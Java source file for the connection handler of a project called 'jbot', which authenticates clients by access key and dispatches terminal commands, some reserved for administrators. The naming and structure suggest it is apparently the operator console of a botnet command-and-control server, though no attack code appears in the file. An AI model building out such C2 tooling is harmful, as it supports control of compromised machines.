package me.aaronakhtar.jbot.threads.handlers;

import me.aaronakhtar.jbot.Main;
import me.aaronakhtar.jbot.Utilities;
import me.aaronakhtar.jbot.command_manager.JBotCommand;
import me.aaronakhtar.jbot.file_manager.files.AccessKeysFile;
import me.aaronakhtar.jbot.objects.ConnectionType;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Socket;

public class ClientHandler implements Runnable {

    public static void writeToClient(String s, BufferedWriter writer) throws Exception {
        writer.write(s + Utilities.Colour.RESET.get());
        writer.flush();
    }

    public String accessKey;
    private Socket socket;

    public ClientHandler(Socket socket) {
        this.socket = socket;
    }

    @Override
    public void run() {
        try(    Socket socket = this.socket;
                BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()))){
            String input;

            Utilities.setTerminalName("*", writer);
            writeToClient(Utilities.Colour.GREEN.get() + "Access-Key: ", writer);

            accessKey = reader.readLine();

            if (!AccessKeysFile.getAccessKeys().contains(accessKey)){
                writeToClient(Utilities.Colour.CLEAR.get() + Utilities.Colour.RED.get() + "Failed to Authenticate your Access-Key...", writer);
                Thread.sleep(3800);
                return;
            }

            writeToClient(Utilities.Colour.CLEAR.get() + Utilities.Colour.GREEN.get() + "Successfully Authenticated your Access-Key...", writer);
            Main.connectedClients.add(socket);
            Utilities.sendJoinMessage(ConnectionType.CLIENT, null, socket);
            Thread.sleep(1900);
            writeToClient(Utilities.Colour.CLEAR.get(), writer);
            Utilities.setTerminalName(Main.name + " Network", writer);

            while(Main.isRunning){
                try {
                    writeToClient(Utilities.Colour.BLACK.get() + Utilities.Colour.GREEN_BG.get() + " @"+Main.name+" " + Utilities.Colour.RESET.get() + " ~# ", writer);
                    input = reader.readLine();
                    if (input == null) return;
                    if (input.isEmpty()) continue;
                    final String[] args = input.split(" ");
                    for (Class<? extends JBotCommand> commandClass : Main.commands) {
                        final JBotCommand command = commandClass.newInstance();
                        if (command.getCommand().equalsIgnoreCase(args[0])) {
                            System.out.println(Utilities.Colour.YELLOW.get() + "[Client-Command] " + Utilities.Colour.RESET.get() + "["+socket.getInetAddress().getHostAddress()+"@"+accessKey+"] -> " + input);
                            if (command.isAdminCommand() && !Utilities.isKeyAdministrator(accessKey)) {
                                writeToClient(Utilities.Colour.BLACK.get() + Utilities.Colour.RED_BG.get() + "This command is reserved for Administrators...\r\n", writer);
                                break;
                            }
                            writeToClient("\r\n", writer);
                            command.doAction(args, this, writer, reader);
                            writeToClient("\r\n", writer);
                        }
                    }
                }catch (Exception e){

                }

            }




        }catch (Exception e){

        }finally {
            if (Main.connectedClients.contains(this.socket)){
                Main.connectedClients.remove(this.socket);
                System.out.println(Utilities.Colour.YELLOW.get() + "[Client] " + Utilities.Colour.RESET.get() + "Client Disconnected @" + socket.getInetAddress().getHostAddress() + "...");
            }
        }

    }

    public Socket getSocket() {
        return socket;
    }
}
